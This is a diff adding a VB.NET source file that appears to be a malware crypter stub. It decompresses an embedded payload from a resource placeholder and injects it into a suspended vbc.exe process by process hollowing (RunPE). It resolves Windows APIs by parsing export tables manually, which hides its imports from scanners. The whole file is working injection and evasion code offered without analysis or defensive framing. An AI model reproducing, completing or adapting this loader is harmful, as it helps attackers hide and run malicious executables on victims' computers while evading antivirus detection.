@@ -1,0 +1,165 @@
+Imports System, Microsoft.VisualBasic
+Imports Microsoft.VisualBasic.CompilerServices
+Imports System.Reflection
+Imports System.Text
+Imports System.Security.Cryptography
+Imports System.IO.Compression
+Imports System.IO
+Imports System.Runtime.InteropServices
+Imports System.Runtime.CompilerServices
+Imports System.Reflection.Emit
+
+Namespace bp_Spc
+
+    Public Class bp_Cls
+
+        Public Shared Sub bp_Mth()
+            Try
+                Win32.RunPE(retrieveFile("%FileName%"), Nothing)
+            Catch ex As Exception
+                MsgBox(ex.Message)
+            End Try
+
+        End Sub
+
+        Public Shared Function retrieveFile(ByVal resName As String) As Byte()
+            Dim res_Man As New Resources.ResourceManager("2016", Reflection.Assembly.GetExecutingAssembly)
+            Return Decompress(res_Man.GetObject(resName))
+        End Function
+
+        Public Shared Function Decompress(data As Byte()) As Byte()
+            Dim input As New MemoryStream()
+            input.Write(data, 0, data.Length)
+            input.Position = 0
+            Dim gzip As New GZipStream(input, CompressionMode.Decompress, True)
+            Dim output As New MemoryStream()
+            Dim buff As Byte() = New Byte(63) {}
+            Dim read As Integer = -1
+            read = gzip.Read(buff, 0, buff.Length)
+            While read > 0
+                output.Write(buff, 0, read)
+                read = gzip.Read(buff, 0, buff.Length)
+            End While
+            gzip.Close()
+            Return output.ToArray()
+        End Function
+
+    End Class
+
+
+    <System.Security.SuppressUnmanagedCodeSecurity()> _
+    Public Class Win32
+
+#Region "Dynamic API Caller"
+
+        Private Delegate Function LoadLibraryAParameters(ByVal name As String) As IntPtr
+        Private Shared ReadOnly LoadLibrary As LoadLibraryAParameters = CreateApi(Of LoadLibraryAParameters)("kernel32", "LoadLibraryA")
+
+        Private Shared Function CreateApi(Of DelegateInstance)(ByVal name As String, ByVal method As String) As DelegateInstance
+            Return CType(DirectCast(Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(CType(GetProcAddress(CLng(GetInternalModuleBaseAddr(name)), method), IntPtr), GetType(DelegateInstance)), Object), DelegateInstance)
+        End Function
+
+        Private Shared Function GetInternalModuleBaseAddr(ByVal ModuleName As String) As IntPtr
+
+            If ModuleName.Contains(".dll") = False Then ModuleName = ModuleName & ".dll"
+            Dim ModuleBaseAddress As IntPtr = Nothing
+            For Each ProcessModule As System.Diagnostics.ProcessModule In System.Diagnostics.Process.GetCurrentProcess.Modules
+                If ProcessModule.ModuleName.ToLower = ModuleName Then Return ProcessModule.BaseAddress
+            Next
+            Return LoadLibrary(ModuleName)
+
+        End Function
+
+        Private Shared Function ReadByteArray(ByVal Address As IntPtr, ByVal Size As Integer) As Byte()
+
+            Dim ReturnArray(Size - 1) As Byte
+            System.Runtime.InteropServices.Marshal.Copy(Address, ReturnArray, 0, Size)
+            Return ReturnArray
+
+        End Function
+
+        Private Shared Function GetProcAddress(ByVal ModuleAddress As Int64, ByVal Export As String) As Int64
+
+            Dim IExportDir() As Byte = Nothing
+            If IntPtr.Size = 4 Then IExportDir = ReadByteArray(CType(ModuleAddress + System.Runtime.InteropServices.Marshal.ReadInt32(CType(ModuleAddress + System.Runtime.InteropServices.Marshal.ReadInt32(CType(ModuleAddress + &H3C, IntPtr)) + &H78, IntPtr)) + 24, IntPtr), 16)
+            If IntPtr.Size = 8 Then IExportDir = ReadByteArray(CType(ModuleAddress + System.Runtime.InteropServices.Marshal.ReadInt32(CType(ModuleAddress + System.Runtime.InteropServices.Marshal.ReadInt32(CType(ModuleAddress + &H3C, IntPtr)) + &H88, IntPtr)) + 24, IntPtr), 16)
+            For i As Integer = 0 To BitConverter.ToInt32(IExportDir, 0) Step 1
+                Dim tpAddress As Integer = System.Runtime.InteropServices.Marshal.ReadInt32(CType(BitConverter.ToInt32(IExportDir, 8) + ModuleAddress + i * 4, IntPtr))
+                Dim ApiString As String = System.Text.Encoding.ASCII.GetString(ReadByteArray(CType(ModuleAddress + tpAddress, IntPtr), 64)).Split(CChar(vbNullChar))(0)
+                Dim Ord As Integer = BitConverter.ToInt16(ReadByteArray(CType(BitConverter.ToInt32(IExportDir, 12) + ModuleAddress + i * 2, IntPtr), 2), 0)
+                If ApiString = Export Then Return BitConverter.ToInt32(ReadByteArray(CType(BitConverter.ToInt32(IExportDir, 4) + ModuleAddress + (Ord * 4), IntPtr), 4), 0) + ModuleAddress
+            Next
+            Return Nothing
+
+        End Function
+
+#End Region
+
+        Private Shared ReadOnly x() As Integer = {1, 16, 2, 32, 4, 64, 4, 64}
+
+        Private Delegate Function CP(ByVal appName As String, ByVal commandLine As StringBuilder, ByVal procAttr As IntPtr, ByVal thrAttr As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal inherit As Boolean, ByVal creation As Integer, ByVal env As IntPtr, ByVal curDir As String, ByVal sInfo() As Byte, ByVal pInfo() As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
+        Private Delegate Function GTC(ByVal hThr As IntPtr, ByVal ctxt() As UInteger) As <MarshalAs(UnmanagedType.Bool)> Boolean
+        Private Delegate Function NTU(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr) As UInteger
+        Private Delegate Function RPM(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByRef bufr As IntPtr, ByVal bufrSize As IntPtr, ByRef numRead As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
+        Private Delegate Function RT(ByVal hThr As IntPtr) As Integer
+        Private Delegate Function STC(ByVal hThr As IntPtr, ByVal ctxt() As UInteger) As <MarshalAs(UnmanagedType.Bool)> Boolean
+        Private Delegate Function VAE(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal size As IntPtr, ByVal allocType As Integer, ByVal prot As Integer) As IntPtr
+        Private Delegate Function VPE(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal size As IntPtr, ByVal newProt As Integer, ByRef oldProt As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
+        Private Delegate Function WPM(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByVal buff() As Byte, ByVal size As IntPtr, ByRef numRead As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
+
+
+        Public Shared Sub RunPE(ByVal bytes() As Byte, ByVal surrogateProcess As String)
+
+            If surrogateProcess = Nothing Then
+                surrogateProcess = RuntimeEnvironment.GetRuntimeDirectory & "vbc.exe"
+            End If
+
+            Dim CreateProcess As CP = CreateApi(Of CP)("kernel32", "CreateProcessA")
+            Dim GetThreadContext As GTC = CreateApi(Of GTC)("kernel32", "GetThreadContext")
+            Dim NtUnmapViewOfSection As NTU = CreateApi(Of NTU)("ntdll", "NtUnmapViewOfSection")
+            Dim ReadProcessMemory As RPM = CreateApi(Of RPM)("kernel32", "ReadProcessMemory")
+            Dim ResumeThread As RT = CreateApi(Of RT)("kernel32", "ResumeThread")
+            Dim SetThreadContext As STC = CreateApi(Of STC)("kernel32", "SetThreadContext")
+            Dim VirtualAllocEx As VAE = CreateApi(Of VAE)("kernel32", "VirtualAllocEx")
+            Dim VirtualProtectEx As VPE = CreateApi(Of VPE)("kernel32", "VirtualProtectEx")
+            Dim WriteProcessMemory As WPM = CreateApi(Of WPM)("kernel32", "WriteProcessMemory")
+
+            Dim offsetNtHeaders As Integer = BitConverter.ToInt32(bytes, 60)
+            Dim numberOfSections As Integer = BitConverter.ToInt16(bytes, offsetNtHeaders + 6)
+            Dim sizeOfHeaders As New IntPtr(BitConverter.ToInt32(bytes, offsetNtHeaders + 84))
+            Dim si(67) As Byte
+            Dim pi(3) As IntPtr
+            If Not CreateProcess(Nothing, New StringBuilder(surrogateProcess), Nothing, Nothing, _
+               False, 4, Nothing, Nothing, si, pi) Then Return
+            Dim ctxt(178) As UInteger
+            ctxt(0) = &H10002
+            Dim base, junk, addr As IntPtr
+            Dim res As Boolean
+            Dim junk2 As Integer
+            If GetThreadContext(pi(1), ctxt) Then
+                If ReadProcessMemory(pi(0), New IntPtr(ctxt(41) + 8), addr, New IntPtr(4), junk) Then
+                    If NtUnmapViewOfSection(pi(0), addr) = 0 Then
+                        base = VirtualAllocEx(pi(0), New IntPtr(BitConverter.ToInt32(bytes, offsetNtHeaders + 52)), _
+                        New IntPtr(BitConverter.ToInt32(bytes, offsetNtHeaders + 80)), 12288, 64)
+                        res = WriteProcessMemory(pi(0), base, bytes, sizeOfHeaders, junk)
+                        For i As Integer = 0 To numberOfSections - 1
+                            Dim sh(9) As Integer
+                            Buffer.BlockCopy(bytes, offsetNtHeaders + 248 + (i * 40), sh, 0, 40)
+                            Dim raw(sh(4) - 1) As Byte
+                            Buffer.BlockCopy(bytes, sh(5), raw, 0, raw.Length)
+                            res = WriteProcessMemory(pi(0), New IntPtr(base.ToInt32 + sh(3)), raw, New IntPtr(raw.Length), junk)
+                            res = VirtualProtectEx(pi(0), New IntPtr(base.ToInt32 + sh(3)), _
+                             New IntPtr(sh(2)), x((sh(9) >> 29) And &H7), junk2)
+                        Next
+                        res = WriteProcessMemory(pi(0), New IntPtr(ctxt(41) + 8), BitConverter.GetBytes(base.ToInt32), _
+                        New IntPtr(4), junk)
+                        ctxt(44) = CType(base.ToInt32 + BitConverter.ToInt32(bytes, offsetNtHeaders + 40), UInteger)
+                        SetThreadContext(pi(1), ctxt)
+                    End If
+                End If
+            End If
+            ResumeThread(pi(1))
+        End Sub
+    End Class
+
+End Namespace
